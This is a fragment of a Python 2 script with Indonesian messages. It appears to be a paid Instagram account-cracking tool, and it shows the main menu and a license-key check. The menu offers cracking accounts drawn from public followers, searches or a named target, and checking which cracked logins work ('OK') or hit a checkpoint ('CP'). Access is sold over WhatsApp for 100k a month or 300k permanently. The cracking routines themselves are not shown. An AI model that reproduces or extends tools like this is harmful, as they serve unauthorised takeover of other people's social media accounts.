	print k+" >_"+h+" Author:"+k+" Mbokey"
	print k+" >_"+h+" Coding:"+k+" Python27"
	print versi
	try:
		if followerz == followerzz:
			try:
				tgl = datetime.datetime.now()
				bln = tgl.month
				thn = tgl.year
				day = tgl.day
				mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))
				seles = datetime.date(thn, bln, day)
				sisa = mulai - seles
				lim_dev_id = str(sisa).split()[0]
				if "U" in fol_dev:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+p+"Unlimited"
				else:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+k+lim_dev_id+" "+p+"Hari lagi"
					if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
						hapus_cokiz()
						print " Kamu sudah melebihi batas pemakaian\n Silahkan hubungi admin untuk order Lisensinya lagi"
						pil_kon.append("IqbalDev")
			except:
				hapus_cokiz()	
		else:
			print belum_premium
	except:
		print belum_premium
	print garis
	print a+" ["+k+"1"+a+"] "+p+"Crack dari followers Publik "+k+"{"+a+"Rusak ber lisensi:v"+k+"}"
	print a+" ["+k+"2"+a+"] "+p+"Crack dari Pencarian Orang"
	print a+" ["+k+"3"+a+"] "+p+"Crack Target"
	print a+" ["+k+"4"+a+"] "+p+"Cek hasil"+h+" OK"+a+"/"+k+"CP"
	print a+" ["+k+"5"+a+"] "+p+"Auto Followers"
	print a+" ["+k+"6"+a+"] "+h+"Cek Login hasil Akun"+k+" CP"
#	print a+" ["+k+"7"+a+"] "+p+"Update Tool"
	print a+" ["+k+"7"+a+"] "+p+"Log Out Akun Instagram"
	print garis
	if len(pil_kon) != 1:
		pil = raw_input(p+"  ? Pilih"+k+": ")
	else:
		pil = "upgrade_premium"
	try:
		
		if followerz == followerzz:
			pilihan(pil)
		else:
			print m+" Belum Premium......"
			pil = "upgrade_premium"
	except NameError:
		print k+"\n >< Harus Premium.....!\n"
		pil = "upgrade_premium"
	if pil == "upgrade_premium":
		dat_ke = str(random.randint(12312, 999999999999999))
		try:
			open("cokiz.txt", "r").read()
		except IOError:
			_yuk_(dat_ke)
		_uyuk_()
		id_key = base64.b64encode(followerz.replace("O", ""))
		no_wa = "62+ wkwkwk"
		print h+" Ikuti Arahannya..."
		print p+"""
	Chat Admin untuk beli lisensi, 
	kirimkan Tool Key nya ke Admin, 
	untuk Konfirmasi Lisensinya,
	No WhatsApp Admin =>"""+k+""" 62+ wkwkw	\n"""
		print h+" >- "+p+"1 Bulan "+k+"100k"
		print h+" >- "+p+"Permanen/Unlimited "+k+"300k"
		print h+" >- "+p+"No Dana/OVO "+a+"==> "+k+"62+ wkwkw"
		try:
			print p+"\n Berikan "+a+"Tool Key"+p+" ke Admin,\n kirim bukti pembayarnnya\n untuk Konfirmasi Lisensi"
#			subprocess.check_output(["am", "start", "https://wa.me/"+no_wa+"?text=*Tool%20Key:%20"+id_key+"*\nAssalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Tool%20Instagram!"])
		except:
			pass
		print a+"-"*40
		print p+" >>> Tool Key "+k+"==> "+h+id_key
		print a+"-"*40
		try:
			f = raw_input(p+" >_"+h+" Masukkan Lisensinya"+k+": ")
			
			z = ""
			for iqbal_dev in f.split("%"):
				try:
					z += iqbal_dev[0]
				except:
					pass
			print z
			print followerz
			if base64.b32decode(z) == followerz or base64.b32decode(z) == followerz+"U":
				with open("cokiz.txt", "a") as tulis_:
					tgl = datetime.datetime.now()
					bln = tgl.month
					thn = tgl.year
					day = tgl.day
					jm_hari = str(monthrange(thn,bln)).replace("(", "").replace(")", "").split()[1]
					tgls = str(thn)+" "+str(bln+1)+" "+str(day)
					if "12" in str(bln):
						bln = 1
						thn = thn+1
						tgls = str(thn)+" "+str(bln)+" "+str(day)
					tulis_.write(">"+f+">"+p1+"%>"+base64.b64encode(tgls))
					print a+"\n Lisensi Suksess...\n"
			else:
				print m+"\n Lisensi Salah...\n"
		except:
			print m+"\n Lisensi Salah...\n"
# Mau Ngapain Cuk?
if __name__=="__main__":
	cek_login()
	menu_dev()
